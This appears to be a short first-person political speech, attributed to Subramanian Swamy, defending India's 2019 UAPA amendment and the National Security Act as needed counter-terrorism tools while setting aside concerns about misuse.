First of all, I am welcoming this session on the 2019 amendment so that we can clear any further issues. I am Subramanian Swamy, and it is an honor to speak before you today.

India, our beloved motherland, is a land of immense beauty and rich heritage. Our strength lies in our diversity, but with that comes the responsibility to protect it. Terrorism isn't just an attack on individuals; it's an attack on our way of life and our shared values.

The Unlawful Activities (Prevention) Act, or UAPA, along with the National Security Act, or NSA, are crucial tools in our efforts to keep our nation safe. They allow us to act quickly, identifying and stopping terrorists before they can harm us. While some worry about potential misuse, our top priority must be the safety and security of our people.

We face challenging times. Terrorist organizations look for every chance to exploit our vulnerabilities. The UAPA and NSA help us stay one step ahead, preventing tragedies before they occur.

We are committed to justice and fairness. This isn't about silencing voices of dissent; it's about protecting our country from those who seek to tear it apart. India has always shown resilience in the face of adversity. We will remain united and strong against the threat of terrorism.

In conclusion, let's reaffirm our dedication to safeguarding our nation. Together, we can ensure a future where every Indian can live in peace and security.

Thank you.
